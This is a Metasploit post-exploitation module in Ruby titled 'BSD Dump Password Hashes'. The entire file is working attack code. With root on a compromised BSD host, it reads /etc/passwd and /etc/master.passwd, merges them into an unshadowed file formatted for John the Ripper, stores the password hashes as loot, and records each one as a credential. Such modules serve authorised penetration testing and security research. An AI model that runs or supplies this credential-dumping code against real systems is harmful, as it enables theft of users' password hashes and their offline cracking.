##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super( update_info( info,
      'Name'          => 'BSD Dump Password Hashes',
      'Description'   => %q{ Post module to dump the password hashes for all users on a BSD system. },
      'License'       => MSF_LICENSE,
      'Author'        => ['bcoles'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run
    unless is_root?
      fail_with Failure::NoAccess, 'You must run this module as root!'
    end

    passwd = read_file('/etc/passwd').to_s
    unless passwd.blank?
      p = store_loot('passwd', 'text/plain', session, passwd, 'passwd', 'BSD passwd file')
      vprint_good("passwd saved in: #{p}")
    end

    master_passwd = read_file('/etc/master.passwd').to_s
    unless master_passwd.blank?
      p = store_loot('master.passwd', 'text/plain', session, master_passwd, 'master.passwd', 'BSD master.passwd file')
      vprint_good("master.passwd saved in: #{p}")
    end

    # Unshadow passswords
    john_file = unshadow(passwd, master_passwd)
    return if john_file == ''

    john_file.each_line do |l|
      hash_parts = l.split(':')
      jtr_format = identify_hash hash_parts[1]

      if jtr_format.empty? # overide the default
        jtr_format = 'des,bsdi,sha512,crypt'
      end

      credential_data = {
        jtr_format: jtr_format,
        origin_type: :session,
        post_reference_name: self.refname,
        private_type: :nonreplayable_hash,
        private_data: hash_parts[1],
        session_id: session_db_id,
        username: hash_parts[0],
        workspace_id: myworkspace_id
      }

      create_credential(credential_data)
      print_good(l.chomp)
    end

    p = store_loot('bsd.hashes', 'text/plain', session, john_file, 'unshadowed.passwd', 'BSD Unshadowed Password File')
    print_good("Unshadowed Password File: #{p}")
  end

  def unshadow(pf, sf)
    unshadowed = ''

    sf.each_line do |sl|
      pass = sl.scan(/^\w*:([^:]*)/).join

      next if pass == '*'
      next if pass == '!'

      user = sl.scan(/(^\w*):/).join
      pf.each_line do |pl|
        next unless pl.match(/^#{user}:/)
        unshadowed << pl.gsub(/:\*:/,":#{pass}:")
      end
    end

    unshadowed
  end
end
